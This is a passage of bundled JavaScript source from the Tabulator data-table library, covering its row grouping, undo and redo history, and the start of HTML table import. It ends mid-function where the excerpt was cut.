      toggleElement = this.groupManager.table.options.groupToggleElement == "arrow" ? this.arrowElement : this.element;
      toggleElement.addEventListener("click", (e2) => {
        if (this.groupManager.table.options.groupToggleElement === "arrow") {
          e2.stopPropagation();
          e2.stopImmediatePropagation();
        }
        setTimeout(() => {
          this.toggleVisibility();
        });
      });
    }
  }
  _createGroup(groupID, level) {
    var groupKey = level + "_" + groupID;
    var group = new Group(this.groupManager, this, level, groupID, this.groupManager.groupIDLookups[level].field, this.groupManager.headerGenerator[level] || this.groupManager.headerGenerator[0], this.old ? this.old.groups[groupKey] : false);
    this.groups[groupKey] = group;
    this.groupList.push(group);
  }
  _addRowToGroup(row) {
    var level = this.level + 1;
    if (this.hasSubGroups) {
      var groupID = this.groupManager.groupIDLookups[level].func(row.getData()), groupKey = level + "_" + groupID;
      if (this.groupManager.allowedValues && this.groupManager.allowedValues[level]) {
        if (this.groups[groupKey]) {
          this.groups[groupKey].addRow(row);
        }
      } else {
        if (!this.groups[groupKey]) {
          this._createGroup(groupID, level);
        }
        this.groups[groupKey].addRow(row);
      }
    }
  }
  _addRow(row) {
    this.rows.push(row);
    row.modules.group = this;
  }
  insertRow(row, to, after) {
    var data = this.conformRowData({});
    row.updateData(data);
    var toIndex = this.rows.indexOf(to);
    if (toIndex > -1) {
      if (after) {
        this.rows.splice(toIndex + 1, 0, row);
      } else {
        this.rows.splice(toIndex, 0, row);
      }
    } else {
      if (after) {
        this.rows.push(row);
      } else {
        this.rows.unshift(row);
      }
    }
    row.modules.group = this;
    if (this.groupManager.table.modExists("columnCalcs") && this.groupManager.table.options.columnCalcs != "table") {
      this.groupManager.table.modules.columnCalcs.recalcGroup(this);
    }
    this.groupManager.updateGroupRows(true);
  }
  scrollHeader(left2) {
    if (this.arrowElement) {
      this.arrowElement.style.marginLeft = left2;
      this.groupList.forEach(function(child) {
        child.scrollHeader(left2);
      });
    }
  }
  getRowIndex(row) {
  }
  //update row data to match grouping constraints
  conformRowData(data) {
    if (this.field) {
      data[this.field] = this.key;
    } else {
      console.warn("Data Conforming Error - Cannot conform row data to match new group as groupBy is a function");
    }
    if (this.parent) {
      data = this.parent.conformRowData(data);
    }
    return data;
  }
  removeRow(row) {
    var index = this.rows.indexOf(row);
    var el = row.getElement();
    if (index > -1) {
      this.rows.splice(index, 1);
    }
    if (!this.groupManager.table.options.groupValues && !this.rows.length) {
      if (this.parent) {
        this.parent.removeGroup(this);
      } else {
        this.groupManager.removeGroup(this);
      }
      this.groupManager.updateGroupRows(true);
    } else {
      if (el.parentNode) {
        el.parentNode.removeChild(el);
      }
      if (!this.groupManager.blockRedraw) {
        this.generateGroupHeaderContents();
        if (this.groupManager.table.modExists("columnCalcs") && this.groupManager.table.options.columnCalcs != "table") {
          this.groupManager.table.modules.columnCalcs.recalcGroup(this);
        }
      }
    }
  }
  removeGroup(group) {
    var groupKey = group.level + "_" + group.key, index;
    if (this.groups[groupKey]) {
      delete this.groups[groupKey];
      index = this.groupList.indexOf(group);
      if (index > -1) {
        this.groupList.splice(index, 1);
      }
      if (!this.groupList.length) {
        if (this.parent) {
          this.parent.removeGroup(this);
        } else {
          this.groupManager.removeGroup(this);
        }
      }
    }
  }
  getHeadersAndRows() {
    var output = [];
    output.push(this);
    this._visSet();
    if (this.calcs.top) {
      this.calcs.top.detachElement();
      this.calcs.top.deleteCells();
    }
    if (this.calcs.bottom) {
      this.calcs.bottom.detachElement();
      this.calcs.bottom.deleteCells();
    }
    if (this.visible) {
      if (this.groupList.length) {
        this.groupList.forEach(function(group) {
          output = output.concat(group.getHeadersAndRows());
        });
      } else {
        if (this.groupManager.table.options.columnCalcs != "table" && this.groupManager.table.modExists("columnCalcs") && this.groupManager.table.modules.columnCalcs.hasTopCalcs()) {
          this.calcs.top = this.groupManager.table.modules.columnCalcs.generateTopRow(this.rows);
          output.push(this.calcs.top);
        }
        output = output.concat(this.rows);
        if (this.groupManager.table.options.columnCalcs != "table" && this.groupManager.table.modExists("columnCalcs") && this.groupManager.table.modules.columnCalcs.hasBottomCalcs()) {
          this.calcs.bottom = this.groupManager.table.modules.columnCalcs.generateBottomRow(this.rows);
          output.push(this.calcs.bottom);
        }
      }
    } else {
      if (!this.groupList.length && this.groupManager.table.options.columnCalcs != "table") {
        if (this.groupManager.table.modExists("columnCalcs")) {
          if (this.groupManager.table.modules.columnCalcs.hasTopCalcs()) {
            if (this.groupManager.table.options.groupClosedShowCalcs) {
              this.calcs.top = this.groupManager.table.modules.columnCalcs.generateTopRow(this.rows);
              output.push(this.calcs.top);
            }
          }
          if (this.groupManager.table.modules.columnCalcs.hasBottomCalcs()) {
            if (this.groupManager.table.options.groupClosedShowCalcs) {
              this.calcs.bottom = this.groupManager.table.modules.columnCalcs.generateBottomRow(this.rows);
              output.push(this.calcs.bottom);
            }
          }
        }
      }
    }
    return output;
  }
  getData(visible, transform) {
    var output = [];
    this._visSet();
    if (!visible || visible && this.visible) {
      this.rows.forEach((row) => {
        output.push(row.getData(transform || "data"));
      });
    }
    return output;
  }
  getRowCount() {
    var count = 0;
    if (this.groupList.length) {
      this.groupList.forEach((group) => {
        count += group.getRowCount();
      });
    } else {
      count = this.rows.length;
    }
    return count;
  }
  toggleVisibility() {
    if (this.visible) {
      this.hide();
    } else {
      this.show();
    }
  }
  hide() {
    this.visible = false;
    if (this.groupManager.table.rowManager.getRenderMode() == "basic" && !this.groupManager.table.options.pagination) {
      this.element.classList.remove("tabulator-group-visible");
      if (this.groupList.length) {
        this.groupList.forEach((group) => {
          var rows2 = group.getHeadersAndRows();
          rows2.forEach((row) => {
            row.detachElement();
          });
        });
      } else {
        this.rows.forEach((row) => {
          var rowEl = row.getElement();
          rowEl.parentNode.removeChild(rowEl);
        });
      }
      this.groupManager.updateGroupRows(true);
    } else {
      this.groupManager.updateGroupRows(true);
    }
    this.groupManager.table.externalEvents.dispatch("groupVisibilityChanged", this.getComponent(), false);
  }
  show() {
    this.visible = true;
    if (this.groupManager.table.rowManager.getRenderMode() == "basic" && !this.groupManager.table.options.pagination) {
      this.element.classList.add("tabulator-group-visible");
      var prev = this.generateElement();
      if (this.groupList.length) {
        this.groupList.forEach((group) => {
          var rows2 = group.getHeadersAndRows();
          rows2.forEach((row) => {
            var rowEl = row.getElement();
            prev.parentNode.insertBefore(rowEl, prev.nextSibling);
            row.initialize();
            prev = rowEl;
          });
        });
      } else {
        this.rows.forEach((row) => {
          var rowEl = row.getElement();
          prev.parentNode.insertBefore(rowEl, prev.nextSibling);
          row.initialize();
          prev = rowEl;
        });
      }
      this.groupManager.updateGroupRows(true);
    } else {
      this.groupManager.updateGroupRows(true);
    }
    this.groupManager.table.externalEvents.dispatch("groupVisibilityChanged", this.getComponent(), true);
  }
  _visSet() {
    var data = [];
    if (typeof this.visible == "function") {
      this.rows.forEach(function(row) {
        data.push(row.getData());
      });
      this.visible = this.visible(this.key, this.getRowCount(), data, this.getComponent());
    }
  }
  getRowGroup(row) {
    var match2 = false;
    if (this.groupList.length) {
      this.groupList.forEach(function(group) {
        var result = group.getRowGroup(row);
        if (result) {
          match2 = result;
        }
      });
    } else {
      if (this.rows.find(function(item) {
        return item === row;
      })) {
        match2 = this;
      }
    }
    return match2;
  }
  getSubGroups(component) {
    var output = [];
    this.groupList.forEach(function(child) {
      output.push(component ? child.getComponent() : child);
    });
    return output;
  }
  getRows(component, includeChildren) {
    var output = [];
    if (includeChildren && this.groupList.length) {
      this.groupList.forEach((group) => {
        output = output.concat(group.getRows(component, includeChildren));
      });
    } else {
      this.rows.forEach(function(row) {
        output.push(component ? row.getComponent() : row);
      });
    }
    return output;
  }
  generateGroupHeaderContents() {
    var data = [];
    var rows2 = this.getRows(false, true);
    rows2.forEach(function(row) {
      data.push(row.getData());
    });
    this.elementContents = this.generator(this.key, this.getRowCount(), data, this.getComponent());
    while (this.element.firstChild) this.element.removeChild(this.element.firstChild);
    if (typeof this.elementContents === "string") {
      this.element.innerHTML = this.elementContents;
    } else {
      this.element.appendChild(this.elementContents);
    }
    this.element.insertBefore(this.arrowElement, this.element.firstChild);
  }
  getPath(path = []) {
    path.unshift(this.key);
    if (this.parent) {
      this.parent.getPath(path);
    }
    return path;
  }
  ////////////// Standard Row Functions //////////////
  getElement() {
    return this.elementContents ? this.element : this.generateElement();
  }
  generateElement() {
    this.addBindings = false;
    this._visSet();
    if (this.visible) {
      this.element.classList.add("tabulator-group-visible");
    } else {
      this.element.classList.remove("tabulator-group-visible");
    }
    for (var i2 = 0; i2 < this.element.childNodes.length; ++i2) {
      this.element.childNodes[i2].parentNode.removeChild(this.element.childNodes[i2]);
    }
    this.generateGroupHeaderContents();
    return this.element;
  }
  detachElement() {
    if (this.element && this.element.parentNode) {
      this.element.parentNode.removeChild(this.element);
    }
  }
  //normalize the height of elements in the row
  normalizeHeight() {
    this.setHeight(this.element.clientHeight);
  }
  initialize(force) {
    if (!this.initialized || force) {
      this.normalizeHeight();
      this.initialized = true;
    }
  }
  reinitialize() {
    this.initialized = false;
    this.height = 0;
    if (Helpers.elVisible(this.element)) {
      this.initialize(true);
    }
  }
  setHeight(height) {
    if (this.height != height) {
      this.height = height;
      this.outerHeight = this.element.offsetHeight;
    }
  }
  //return rows outer height
  getHeight() {
    return this.outerHeight;
  }
  getGroup() {
    return this;
  }
  reinitializeHeight() {
  }
  calcHeight() {
  }
  setCellHeight() {
  }
  clearCellHeight() {
  }
  deinitializeHeight() {
  }
  rendered() {
  }
  //////////////// Object Generation /////////////////
  getComponent() {
    if (!this.component) {
      this.component = new GroupComponent(this);
    }
    return this.component;
  }
}
class GroupRows extends Module {
  static moduleName = "groupRows";
  constructor(table) {
    super(table);
    this.groupIDLookups = false;
    this.startOpen = [function() {
      return false;
    }];
    this.headerGenerator = [function() {
      return "";
    }];
    this.groupList = [];
    this.allowedValues = false;
    this.groups = {};
    this.displayHandler = this.getRows.bind(this);
    this.blockRedraw = false;
    this.registerTableOption("groupBy", false);
    this.registerTableOption("groupStartOpen", true);
    this.registerTableOption("groupValues", false);
    this.registerTableOption("groupUpdateOnCellEdit", false);
    this.registerTableOption("groupHeader", false);
    this.registerTableOption("groupHeaderPrint", null);
    this.registerTableOption("groupHeaderClipboard", null);
    this.registerTableOption("groupHeaderHtmlOutput", null);
    this.registerTableOption("groupHeaderDownload", null);
    this.registerTableOption("groupToggleElement", "arrow");
    this.registerTableOption("groupClosedShowCalcs", false);
    this.registerTableFunction("setGroupBy", this.setGroupBy.bind(this));
    this.registerTableFunction("setGroupValues", this.setGroupValues.bind(this));
    this.registerTableFunction("setGroupStartOpen", this.setGroupStartOpen.bind(this));
    this.registerTableFunction("setGroupHeader", this.setGroupHeader.bind(this));
    this.registerTableFunction("getGroups", this.userGetGroups.bind(this));
    this.registerTableFunction("getGroupedData", this.userGetGroupedData.bind(this));
    this.registerComponentFunction("row", "getGroup", this.rowGetGroup.bind(this));
  }
  //initialize group configuration
  initialize() {
    this.subscribe("table-destroy", this._blockRedrawing.bind(this));
    this.subscribe("rows-wipe", this._blockRedrawing.bind(this));
    this.subscribe("rows-wiped", this._restore_redrawing.bind(this));
    if (this.table.options.groupBy) {
      if (this.table.options.groupUpdateOnCellEdit) {
        this.subscribe("cell-value-updated", this.cellUpdated.bind(this));
        this.subscribe("row-data-changed", this.reassignRowToGroup.bind(this), 0);
      }
      this.subscribe("table-built", this.configureGroupSetup.bind(this));
      this.subscribe("row-deleting", this.rowDeleting.bind(this));
      this.subscribe("row-deleted", this.rowsUpdated.bind(this));
      this.subscribe("scroll-horizontal", this.scrollHeaders.bind(this));
      this.subscribe("rows-wipe", this.wipe.bind(this));
      this.subscribe("rows-added", this.rowsUpdated.bind(this));
      this.subscribe("row-moving", this.rowMoving.bind(this));
      this.subscribe("row-adding-index", this.rowAddingIndex.bind(this));
      this.subscribe("rows-sample", this.rowSample.bind(this));
      this.subscribe("render-virtual-fill", this.virtualRenderFill.bind(this));
      this.registerDisplayHandler(this.displayHandler, 20);
      this.initialized = true;
    }
  }
  _blockRedrawing() {
    this.blockRedraw = true;
  }
  _restore_redrawing() {
    this.blockRedraw = false;
  }
  configureGroupSetup() {
    if (this.table.options.groupBy) {
      var groupBy = this.table.options.groupBy, startOpen = this.table.options.groupStartOpen, groupHeader = this.table.options.groupHeader;
      this.allowedValues = this.table.options.groupValues;
      if (Array.isArray(groupBy) && Array.isArray(groupHeader) && groupBy.length > groupHeader.length) {
        console.warn("Error creating group headers, groupHeader array is shorter than groupBy array");
      }
      this.headerGenerator = [function() {
        return "";
      }];
      this.startOpen = [function() {
        return false;
      }];
      this.langBind("groups|item", (langValue, lang) => {
        this.headerGenerator[0] = (value, count, data) => {
          return (typeof value === "undefined" ? "" : value) + "<span>(" + count + " " + (count === 1 ? langValue : lang.groups.items) + ")</span>";
        };
      });
      this.groupIDLookups = [];
      if (groupBy) {
        if (this.table.modExists("columnCalcs") && this.table.options.columnCalcs != "table" && this.table.options.columnCalcs != "both") {
          this.table.modules.columnCalcs.removeCalcs();
        }
      } else {
        if (this.table.modExists("columnCalcs") && this.table.options.columnCalcs != "group") {
          var cols = this.table.columnManager.getRealColumns();
          cols.forEach((col) => {
            if (col.definition.topCalc) {
              this.table.modules.columnCalcs.initializeTopRow();
            }
            if (col.definition.bottomCalc) {
              this.table.modules.columnCalcs.initializeBottomRow();
            }
          });
        }
      }
      if (!Array.isArray(groupBy)) {
        groupBy = [groupBy];
      }
      groupBy.forEach((group, i2) => {
        var lookupFunc, column;
        if (typeof group == "function") {
          lookupFunc = group;
        } else {
          column = this.table.columnManager.getColumnByField(group);
          if (column) {
            lookupFunc = function(data) {
              return column.getFieldValue(data);
            };
          } else {
            lookupFunc = function(data) {
              return data[group];
            };
          }
        }
        this.groupIDLookups.push({
          field: typeof group === "function" ? false : group,
          func: lookupFunc,
          values: this.allowedValues ? this.allowedValues[i2] : false
        });
      });
      if (startOpen) {
        if (!Array.isArray(startOpen)) {
          startOpen = [startOpen];
        }
        startOpen.forEach((level) => {
        });
        this.startOpen = startOpen;
      }
      if (groupHeader) {
        this.headerGenerator = Array.isArray(groupHeader) ? groupHeader : [groupHeader];
      }
    } else {
      this.groupList = [];
      this.groups = {};
    }
  }
  rowSample(rows2, prevValue) {
    if (this.table.options.groupBy) {
      var group = this.getGroups(false)[0];
      prevValue.push(group.getRows(false)[0]);
    }
    return prevValue;
  }
  virtualRenderFill() {
    var el = this.table.rowManager.tableElement;
    var rows2 = this.table.rowManager.getVisibleRows();
    if (this.table.options.groupBy) {
      rows2 = rows2.filter((row) => {
        return row.type !== "group";
      });
      el.style.minWidth = !rows2.length ? this.table.columnManager.getWidth() + "px" : "";
    } else {
      return rows2;
    }
  }
  rowAddingIndex(row, index, top2) {
    if (this.table.options.groupBy) {
      this.assignRowToGroup(row);
      var groupRows = row.modules.group.rows;
      if (groupRows.length > 1) {
        if (!index || index && groupRows.indexOf(index) == -1) {
          if (top2) {
            if (groupRows[0] !== row) {
              index = groupRows[0];
              this.table.rowManager.moveRowInArray(row.modules.group.rows, row, index, !top2);
            }
          } else {
            if (groupRows[groupRows.length - 1] !== row) {
              index = groupRows[groupRows.length - 1];
              this.table.rowManager.moveRowInArray(row.modules.group.rows, row, index, !top2);
            }
          }
        } else {
          this.table.rowManager.moveRowInArray(row.modules.group.rows, row, index, !top2);
        }
      }
      return index;
    }
  }
  trackChanges() {
    this.dispatch("group-changed");
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  setGroupBy(groups) {
    this.table.options.groupBy = groups;
    if (!this.initialized) {
      this.initialize();
    }
    this.configureGroupSetup();
    if (!groups && this.table.modExists("columnCalcs") && this.table.options.columnCalcs === true) {
      this.table.modules.columnCalcs.reinitializeCalcs();
    }
    this.refreshData();
    this.trackChanges();
  }
  setGroupValues(groupValues) {
    this.table.options.groupValues = groupValues;
    this.configureGroupSetup();
    this.refreshData();
    this.trackChanges();
  }
  setGroupStartOpen(values) {
    this.table.options.groupStartOpen = values;
    this.configureGroupSetup();
    if (this.table.options.groupBy) {
      this.refreshData();
      this.trackChanges();
    } else {
      console.warn("Grouping Update - cant refresh view, no groups have been set");
    }
  }
  setGroupHeader(values) {
    this.table.options.groupHeader = values;
    this.configureGroupSetup();
    if (this.table.options.groupBy) {
      this.refreshData();
      this.trackChanges();
    } else {
      console.warn("Grouping Update - cant refresh view, no groups have been set");
    }
  }
  userGetGroups(values) {
    return this.getGroups(true);
  }
  // get grouped table data in the same format as getData()
  userGetGroupedData() {
    return this.table.options.groupBy ? this.getGroupedData() : this.getData();
  }
  ///////////////////////////////////////
  ///////// Component Functions /////////
  ///////////////////////////////////////
  rowGetGroup(row) {
    return row.modules.group ? row.modules.group.getComponent() : false;
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  rowMoving(from, to, after) {
    if (this.table.options.groupBy) {
      if (!after && to instanceof Group) {
        to = this.table.rowManager.prevDisplayRow(from) || to;
      }
      var toGroup = to instanceof Group ? to : to.modules.group;
      var fromGroup = from instanceof Group ? from : from.modules.group;
      if (toGroup === fromGroup) {
        this.table.rowManager.moveRowInArray(toGroup.rows, from, to, after);
      } else {
        if (fromGroup) {
          fromGroup.removeRow(from);
        }
        toGroup.insertRow(from, to, after);
      }
    }
  }
  rowDeleting(row) {
    if (this.table.options.groupBy && row.modules.group) {
      row.modules.group.removeRow(row);
    }
  }
  rowsUpdated(row) {
    if (this.table.options.groupBy) {
      this.updateGroupRows(true);
    }
  }
  cellUpdated(cell) {
    if (this.table.options.groupBy) {
      this.reassignRowToGroup(cell.row);
    }
  }
  //return appropriate rows with group headers
  getRows(rows2) {
    if (this.table.options.groupBy && this.groupIDLookups.length) {
      this.dispatchExternal("dataGrouping");
      this.generateGroups(rows2);
      if (this.subscribedExternal("dataGrouped")) {
        this.dispatchExternal("dataGrouped", this.getGroups(true));
      }
      return this.updateGroupRows();
    } else {
      return rows2.slice(0);
    }
  }
  getGroups(component) {
    var groupComponents = [];
    this.groupList.forEach(function(group) {
      groupComponents.push(component ? group.getComponent() : group);
    });
    return groupComponents;
  }
  getChildGroups(group) {
    var groupComponents = [];
    if (!group) {
      group = this;
    }
    group.groupList.forEach((child) => {
      if (child.groupList.length) {
        groupComponents = groupComponents.concat(this.getChildGroups(child));
      } else {
        groupComponents.push(child);
      }
    });
    return groupComponents;
  }
  wipe() {
    if (this.table.options.groupBy) {
      this.groupList.forEach(function(group) {
        group.wipe();
      });
      this.groupList = [];
      this.groups = {};
    }
  }
  pullGroupListData(groupList) {
    var groupListData = [];
    groupList.forEach((group) => {
      var groupHeader = {};
      groupHeader.level = 0;
      groupHeader.rowCount = 0;
      groupHeader.headerContent = "";
      var childData = [];
      if (group.hasSubGroups) {
        childData = this.pullGroupListData(group.groupList);
        groupHeader.level = group.level;
        groupHeader.rowCount = childData.length - group.groupList.length;
        groupHeader.headerContent = group.generator(group.key, groupHeader.rowCount, group.rows, group);
        groupListData.push(groupHeader);
        groupListData = groupListData.concat(childData);
      } else {
        groupHeader.level = group.level;
        groupHeader.headerContent = group.generator(group.key, group.rows.length, group.rows, group);
        groupHeader.rowCount = group.getRows().length;
        groupListData.push(groupHeader);
        group.getRows().forEach((row) => {
          groupListData.push(row.getData("data"));
        });
      }
    });
    return groupListData;
  }
  getGroupedData() {
    return this.pullGroupListData(this.groupList);
  }
  getRowGroup(row) {
    var match2 = false;
    if (this.options("dataTree")) {
      row = this.table.modules.dataTree.getTreeParentRoot(row);
    }
    this.groupList.forEach((group) => {
      var result = group.getRowGroup(row);
      if (result) {
        match2 = result;
      }
    });
    return match2;
  }
  countGroups() {
    return this.groupList.length;
  }
  generateGroups(rows2) {
    var oldGroups = this.groups;
    this.groups = {};
    this.groupList = [];
    if (this.allowedValues && this.allowedValues[0]) {
      this.allowedValues[0].forEach((value) => {
        this.createGroup(value, 0, oldGroups);
      });
      rows2.forEach((row) => {
        this.assignRowToExistingGroup(row, oldGroups);
      });
    } else {
      rows2.forEach((row) => {
        this.assignRowToGroup(row, oldGroups);
      });
    }
    Object.values(oldGroups).forEach((group) => {
      group.wipe(true);
    });
  }
  createGroup(groupID, level, oldGroups) {
    var groupKey = level + "_" + groupID, group;
    oldGroups = oldGroups || [];
    group = new Group(this, false, level, groupID, this.groupIDLookups[0].field, this.headerGenerator[0], oldGroups[groupKey]);
    this.groups[groupKey] = group;
    this.groupList.push(group);
  }
  assignRowToExistingGroup(row, oldGroups) {
    var groupID = this.groupIDLookups[0].func(row.getData()), groupKey = "0_" + groupID;
    if (this.groups[groupKey]) {
      this.groups[groupKey].addRow(row);
    }
  }
  assignRowToGroup(row, oldGroups) {
    var groupID = this.groupIDLookups[0].func(row.getData()), newGroupNeeded = !this.groups["0_" + groupID];
    if (newGroupNeeded) {
      this.createGroup(groupID, 0, oldGroups);
    }
    this.groups["0_" + groupID].addRow(row);
    return !newGroupNeeded;
  }
  reassignRowToGroup(row) {
    if (row.type === "row") {
      var oldRowGroup = row.modules.group, oldGroupPath = oldRowGroup.getPath(), newGroupPath = this.getExpectedPath(row), samePath;
      samePath = oldGroupPath.length == newGroupPath.length && oldGroupPath.every((element, index) => {
        return element === newGroupPath[index];
      });
      if (!samePath) {
        oldRowGroup.removeRow(row);
        this.assignRowToGroup(row, this.groups);
        this.refreshData(true);
      }
    }
  }
  getExpectedPath(row) {
    var groupPath = [], rowData = row.getData();
    this.groupIDLookups.forEach((groupId) => {
      groupPath.push(groupId.func(rowData));
    });
    return groupPath;
  }
  updateGroupRows(force) {
    var output = [];
    if (!this.blockRedraw) {
      this.groupList.forEach((group) => {
        output = output.concat(group.getHeadersAndRows());
      });
      if (force) {
        this.refreshData(true);
      }
    }
    return output;
  }
  scrollHeaders(left2) {
    if (this.table.options.groupBy) {
      if (this.table.options.renderHorizontal === "virtual") {
        left2 -= this.table.columnManager.renderer.vDomPadLeft;
      }
      left2 = left2 + "px";
      this.groupList.forEach((group) => {
        group.scrollHeader(left2);
      });
    }
  }
  removeGroup(group) {
    var groupKey = group.level + "_" + group.key, index;
    if (this.groups[groupKey]) {
      delete this.groups[groupKey];
      index = this.groupList.indexOf(group);
      if (index > -1) {
        this.groupList.splice(index, 1);
      }
    }
  }
  checkBasicModeGroupHeaderWidth() {
    var element = this.table.rowManager.tableElement, onlyGroupHeaders = true;
    this.table.rowManager.getDisplayRows().forEach((row, index) => {
      this.table.rowManager.styleRow(row, index);
      element.appendChild(row.getElement());
      row.initialize(true);
      if (row.type !== "group") {
        onlyGroupHeaders = false;
      }
    });
    if (onlyGroupHeaders) {
      element.style.minWidth = this.table.columnManager.getWidth() + "px";
    } else {
      element.style.minWidth = "";
    }
  }
}
var defaultUndoers = {
  cellEdit: function(action) {
    action.component.setValueProcessData(action.data.oldValue);
    action.component.cellRendered();
  },
  rowAdd: function(action) {
    action.component.deleteActual();
    this.table.rowManager.checkPlaceholder();
  },
  rowDelete: function(action) {
    var newRow = this.table.rowManager.addRowActual(action.data.data, action.data.pos, action.data.index);
    if (this.table.options.groupBy && this.table.modExists("groupRows")) {
      this.table.modules.groupRows.updateGroupRows(true);
    }
    this._rebindRow(action.component, newRow);
    this.table.rowManager.checkPlaceholder();
  },
  rowMove: function(action) {
    var after = action.data.posFrom - action.data.posTo > 0;
    this.table.rowManager.moveRowActual(action.component, this.table.rowManager.getRowFromPosition(action.data.posFrom), after);
    this.table.rowManager.regenerateRowPositions();
    this.table.rowManager.reRenderInPosition();
  }
};
var defaultRedoers = {
  cellEdit: function(action) {
    action.component.setValueProcessData(action.data.newValue);
    action.component.cellRendered();
  },
  rowAdd: function(action) {
    var newRow = this.table.rowManager.addRowActual(action.data.data, action.data.pos, action.data.index);
    if (this.table.options.groupBy && this.table.modExists("groupRows")) {
      this.table.modules.groupRows.updateGroupRows(true);
    }
    this._rebindRow(action.component, newRow);
    this.table.rowManager.checkPlaceholder();
  },
  rowDelete: function(action) {
    action.component.deleteActual();
    this.table.rowManager.checkPlaceholder();
  },
  rowMove: function(action) {
    this.table.rowManager.moveRowActual(action.component, this.table.rowManager.getRowFromPosition(action.data.posTo), action.data.after);
    this.table.rowManager.regenerateRowPositions();
    this.table.rowManager.reRenderInPosition();
  }
};
var bindings$1 = {
  undo: ["ctrl + 90", "meta + 90"],
  redo: ["ctrl + 89", "meta + 89"]
};
var actions$1 = {
  undo: function(e2) {
    var cell = false;
    if (this.table.options.history && this.table.modExists("history") && this.table.modExists("edit")) {
      cell = this.table.modules.edit.currentCell;
      if (!cell) {
        e2.preventDefault();
        this.table.modules.history.undo();
      }
    }
  },
  redo: function(e2) {
    var cell = false;
    if (this.table.options.history && this.table.modExists("history") && this.table.modExists("edit")) {
      cell = this.table.modules.edit.currentCell;
      if (!cell) {
        e2.preventDefault();
        this.table.modules.history.redo();
      }
    }
  }
};
var extensions$3 = {
  keybindings: {
    bindings: bindings$1,
    actions: actions$1
  }
};
class History extends Module {
  static moduleName = "history";
  static moduleExtensions = extensions$3;
  //load defaults
  static undoers = defaultUndoers;
  static redoers = defaultRedoers;
  constructor(table) {
    super(table);
    this.history = [];
    this.index = -1;
    this.registerTableOption("history", false);
  }
  initialize() {
    if (this.table.options.history) {
      this.subscribe("cell-value-updated", this.cellUpdated.bind(this));
      this.subscribe("cell-delete", this.clearComponentHistory.bind(this));
      this.subscribe("row-delete", this.rowDeleted.bind(this));
      this.subscribe("rows-wipe", this.clear.bind(this));
      this.subscribe("row-added", this.rowAdded.bind(this));
      this.subscribe("row-move", this.rowMoved.bind(this));
    }
    this.registerTableFunction("undo", this.undo.bind(this));
    this.registerTableFunction("redo", this.redo.bind(this));
    this.registerTableFunction("getHistoryUndoSize", this.getHistoryUndoSize.bind(this));
    this.registerTableFunction("getHistoryRedoSize", this.getHistoryRedoSize.bind(this));
    this.registerTableFunction("clearHistory", this.clear.bind(this));
  }
  rowMoved(from, to, after) {
    this.action("rowMove", from, { posFrom: from.getPosition(), posTo: to.getPosition(), to, after });
  }
  rowAdded(row, data, pos, index) {
    this.action("rowAdd", row, { data, pos, index });
  }
  rowDeleted(row) {
    var index, rows2;
    if (this.table.options.groupBy) {
      rows2 = row.getComponent().getGroup()._getSelf().rows;
      index = rows2.indexOf(row);
      if (index) {
        index = rows2[index - 1];
      }
    } else {
      index = row.table.rowManager.getRowIndex(row);
      if (index) {
        index = row.table.rowManager.rows[index - 1];
      }
    }
    this.action("rowDelete", row, { data: row.getData(), pos: !index, index });
  }
  cellUpdated(cell) {
    this.action("cellEdit", cell, { oldValue: cell.oldValue, newValue: cell.value });
  }
  clear() {
    this.history = [];
    this.index = -1;
  }
  action(type, component, data) {
    this.history = this.history.slice(0, this.index + 1);
    this.history.push({
      type,
      component,
      data
    });
    this.index++;
  }
  getHistoryUndoSize() {
    return this.index + 1;
  }
  getHistoryRedoSize() {
    return this.history.length - (this.index + 1);
  }
  clearComponentHistory(component) {
    var index = this.history.findIndex(function(item) {
      return item.component === component;
    });
    if (index > -1) {
      this.history.splice(index, 1);
      if (index <= this.index) {
        this.index--;
      }
      this.clearComponentHistory(component);
    }
  }
  undo() {
    if (this.index > -1) {
      let action = this.history[this.index];
      History.undoers[action.type].call(this, action);
      this.index--;
      this.dispatchExternal("historyUndo", action.type, action.component.getComponent(), action.data);
      return true;
    } else {
      console.warn(this.options("history") ? "History Undo Error - No more history to undo" : "History module not enabled");
      return false;
    }
  }
  redo() {
    if (this.history.length - 1 > this.index) {
      this.index++;
      let action = this.history[this.index];
      History.redoers[action.type].call(this, action);
      this.dispatchExternal("historyRedo", action.type, action.component.getComponent(), action.data);
      return true;
    } else {
      console.warn(this.options("history") ? "History Redo Error - No more history to redo" : "History module not enabled");
      return false;
    }
  }
  //rebind rows to new element after deletion
  _rebindRow(oldRow, newRow) {
    this.history.forEach(function(action) {
      if (action.component instanceof Row) {
        if (action.component === oldRow) {
          action.component = newRow;
        }
      } else if (action.component instanceof Cell) {
        if (action.component.row === oldRow) {
          var field = action.component.column.getField();
          if (field) {
            action.component = newRow.getCell(field);
          }
        }
      }
    });
  }
}
class HtmlTableImport extends Module {
  static moduleName = "htmlTableImport";
  constructor(table) {
    super(table);
    this.fieldIndex = [];
    this.hasIndex = false;
  }
  initialize() {
    this.tableElementCheck();
  }
  tableElementCheck() {
    if (this.table.originalElement && this.table.originalElement.tagName === "TABLE") {
      if (this.table.originalElement.childNodes.length) {
        this.parseTable();
      } else {
        console.warn("Unable to parse data from empty table tag, Tabulator should be initialized on a div tag unless importing data from a table element.");
      }
    }
  }
  parseTable() {
    var element = this.table.originalElement, options = this.table.options, headers = element.getElementsByTagName("th"), rows2 = element.getElementsByTagName("tbody")[0], data = [];
    this.hasIndex = false;
    this.dispatchExternal("htmlImporting");
    rows2 = rows2 ? rows2.getElementsByTagName("tr") : [];
    this._extractOptions(element, options);
    if (headers.length) {
      this._extractHeaders(headers, rows2);
    } else {
      this._generateBlankHeaders(headers, rows2);
    }
    for (var index = 0; index < rows2.length; index++) {
      var row = rows2[index], cells = row.getElementsByTagName("td"), item = {};
      if (!this.hasIndex) {
        item[options.index] = index;
      }
      for (var i2 = 0; i2 < cells.length; i2++) {
        var cell = cells[i2];
        if (typeof this.fieldIndex[i2] !== "undefined") {
          item[this.fieldIndex[i2]] = cell.innerHTML;
        }
      }
      data.push(item);
    }
    options.data = data;
    this.dispatchExternal("htmlImported");
  }
  //extract tabulator attribute options
  _extractOptions(element, options, defaultOptions2) {
    var attributes = element.attributes;
    var optionsArr = defaultOptions2 ? Object.keys(defaultOptions2) : Object.keys(options);
    var optionsList = {};
    optionsArr.forEach((item) => {
      optionsList[item.toLowerCase()] = item;
    });
    for (var index in attributes) {
      var attrib = attributes[index];
      var name;
